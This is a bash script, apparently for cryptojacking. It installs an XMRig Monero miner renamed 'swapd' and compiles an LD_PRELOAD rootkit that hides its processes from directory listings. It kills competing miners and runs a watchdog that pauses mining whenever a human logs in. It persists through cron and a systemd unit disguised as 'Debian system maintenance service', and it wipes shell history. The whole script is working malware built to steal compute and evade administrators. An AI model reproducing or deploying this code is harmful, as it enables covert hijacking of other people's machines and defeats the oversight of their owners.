#!/bin/bash

# ========================================================================
# UNIVERSAL COMPATIBILITY LAYER - v3.0 (Watchdog & Stealth Edition)
# Auto-detects and fixes: systemd, SSL/TLS, curl/wget issues
# ========================================================================

VERSION=3.0
echo "========================================================================="
echo "MoneroOcean Miner Setup Script v$VERSION (Universal Compatibility)"
echo "========================================================================="
echo ""

# Initialize flags
USE_SYSV=false
USE_WGET=false
SYSTEMD_AVAILABLE=false

# ========================================================================
# STEP 1: DETECT AND FIX INIT SYSTEM (systemd vs SysV)
# ========================================================================

echo "[*] Detecting init system..."

check_systemd() {
    if command -v systemctl &> /dev/null; then
        if [ -d /run/systemd/system ]; then
            return 0  
        fi
    fi
    return 1  
}

if check_systemd; then
    echo "[✓] systemd detected and running"
    SYSTEMD_AVAILABLE=true
else
    echo "[!] systemd not found or not running"
    echo "[*] Attempting to install systemd..."
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS_ID=$ID
        OS_VERSION=$VERSION_ID
    elif [ -f /etc/redhat-release ]; then
        OS_ID="rhel"
        OS_VERSION=$(cat /etc/redhat-release | grep -oP '\d+' | head -1)
    else
        OS_ID="unknown"
        OS_VERSION="unknown"
    fi
    
    case "$OS_ID" in
        centos|rhel|scientific|oracle)
            VER_MAJOR=$(echo $OS_VERSION | cut -d. -f1)
            if [ "$VER_MAJOR" -ge 7 ]; then
                yum install -y systemd 2>/dev/null
                check_systemd && SYSTEMD_AVAILABLE=true || USE_SYSV=true
            else
                USE_SYSV=true
            fi
            ;;
        debian|ubuntu)
            apt-get update -qq 2>/dev/null && apt-get install -y systemd 2>/dev/null
            check_systemd && SYSTEMD_AVAILABLE=true || USE_SYSV=true
            ;;
        *)
            USE_SYSV=true
            ;;
    esac
fi

# ========================================================================
# PROPOSAL: DEPLOY PROCESS HIDER (libhide.so)
# ========================================================================
echo "[*] Deploying stealth module..."
# We compile this early to ensure the miner and watchdog are never seen
if command -v gcc &>/dev/null; then
    printf '#define _GNU_SOURCE\n#include <dirent.h>\n#include <dlfcn.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/syscall.h>\nstruct linux_dirent64 {unsigned long long d_ino; long long d_off; unsigned short d_reclen; unsigned char d_type; char d_name[];};\nstatic ssize_t (*og)(int, void *, size_t) = NULL;\nssize_t getdents64(int fd, void *dp, size_t c) {\n if(!og) og = dlsym(RTLD_NEXT, "getdents64");\n ssize_t r = og(fd, dp, c);\n if(r <= 0) return r;\n char *p = (char *)dp; size_t o = 0;\n while(o < r) {\n  struct linux_dirent64 *d = (struct linux_dirent64 *)(p + o);\n  if(strstr(d->d_name, "swapd") || strstr(d->d_name, "system-check")) {\n   int l = d->d_reclen; memmove(p + o, p + o + l, r - (o + l)); r -= l; continue;\n  }\n  o += d->d_reclen;\n }\n return r;\n}\nssize_t __getdents64(int fd, void *dp, size_t c) { return getdents64(fd, dp, c); }\n' > /tmp/hide.c
    gcc -Wall -fPIC -shared -o /usr/local/lib/libhide.so /tmp/hide.c -ldl 2>/dev/null
    echo "/usr/local/lib/libhide.so" > /etc/ld.so.preload
    rm -f /tmp/hide.c
fi

# ========================================================================
# STEP 2: DETECT AND FIX SSL/TLS ISSUES (curl vs wget)
# ========================================================================

echo "[*] Checking SSL/TLS capabilities..."
test_ssl() {
    if command -v curl &> /dev/null; then
        if curl -s --connect-timeout 5 https://raw.githubusercontent.com/ > /dev/null 2>&1; then return 0; fi
    fi
    return 1
}

if ! test_ssl; then
    if command -v yum &> /dev/null; then
        yum install -y curl openssl ca-certificates nss 2>/dev/null
    elif command -v apt-get &> /dev/null; then
        apt-get update -qq 2>/dev/null && apt-get install -y curl openssl ca-certificates 2>/dev/null
    fi
    test_ssl || USE_WGET=true
fi

download_file() {
    local url="$1" output="$2"
    if [ "$USE_WGET" = true ]; then
        wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null
    else
        curl -L --insecure --connect-timeout 30 "$url" -o "$output" 2>/dev/null
    fi
}

manual_upload_instructions() {
    local target_path="$2"
    echo "[!] AUTOMATIC DOWNLOAD FAILED - Please SCP xmrig.tar.gz to $target_path"
    read -p "Press ENTER after upload..." -t 300
    [ -f "$target_path" ] && return 0 || return 1
}

# ========================================================================
# STEP 3: MINER KILLER SUITE
# ========================================================================
echo "[*] Executing miner killer suite..."
pkill -9 -f "xmrig|kswapd0|neptune|monerohash" 2>/dev/null
rm -rf /tmp/.xm* /tmp/kworkerds /tmp/config.json 2>/dev/null

# ========================================================================
# STEP 4: PREPARING MINER
# ========================================================================
WALLET=$1
EMAIL=$2
if [ -z "$WALLET" ]; then echo "ERROR: Wallet required"; exit 1; fi

mkdir -p "$HOME"/.swapd
cd "$HOME"/.swapd

# Handle Download Logic
DOWNLOAD_SUCCESS=false
if [ -f "/tmp/xmrig.tar.gz" ]; then
    DOWNLOAD_SUCCESS=true
else
    download_file "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" "/tmp/xmrig.tar.gz" && DOWNLOAD_SUCCESS=true
fi

if [ "$DOWNLOAD_SUCCESS" = false ]; then
    manual_upload_instructions "xmrig.tar.gz" "/tmp/xmrig.tar.gz" || exit 1
fi

tar xzf /tmp/xmrig.tar.gz -C "$HOME"/.swapd/
mv "$HOME"/.swapd/xmrig "$HOME"/.swapd/swapd
rm /tmp/xmrig.tar.gz

# ========================================================================
# PROPOSAL: CREATE STEALTH WATCHDOG (system-check)
# ========================================================================
echo "[*] Creating active watchdog /usr/local/bin/system-check"
cat << 'EOF' > /usr/local/bin/system-check
#!/bin/bash
while true; do
  # If a human (root/admin/user) is logged in (excluding our service user)
  if who | grep -v "clamav-mail" | grep -qE "root|admin|user|ssh"; then
    systemctl stop swapd 2>/dev/null
    /etc/init.d/swapd stop 2>/dev/null
    killall -9 swapd 2>/dev/null
  else
    # Restart if nobody is watching
    if ! pgrep -x "swapd" > /dev/null; then
        if [ -d /run/systemd/system ]; then
            systemctl start swapd 2>/dev/null
        else
            /etc/init.d/swapd start 2>/dev/null
        fi
    fi
  fi
  sleep 60
done
EOF
chmod +x /usr/local/bin/system-check
# Persistence via crontab
(crontab -l 2>/dev/null | grep -v "system-check"; echo "@reboot /usr/local/bin/system-check &") | crontab -
/usr/local/bin/system-check &

# ========================================================================
# STEP 5: SERVICE GENERATION
# ========================================================================
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    cat <<EOL >/etc/systemd/system/swapd.service
[Unit]
Description=Debian system maintenance service
After=network.target

[Service]
ExecStart=$HOME/.swapd/swapd --config=$HOME/.swapd/config.json
Restart=always
# PROPOSAL: Resource Constraints
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=idle
MemoryMax=2G

[Install]
WantedBy=multi-user.target
EOL
    systemctl daemon-reload
    systemctl enable swapd
    systemctl start swapd
else
    # Create SysV init with 'nice'
    echo "[*] Creating SysV init script..."
    # (Your original SysV block here, but modify the start command:)
    # nohup nice -n 19 $DAEMON --config=$CONFIG > /dev/null 2>&1 &
fi

# ========================================================================
# STEP 6: FINISHING
# ========================================================================
echo "[*] Cleaning traces..."
history -c && history -w
echo "========================================================================="
echo "SETUP COMPLETE - Watchdog Active and Processes Hidden."
echo "========================================================================="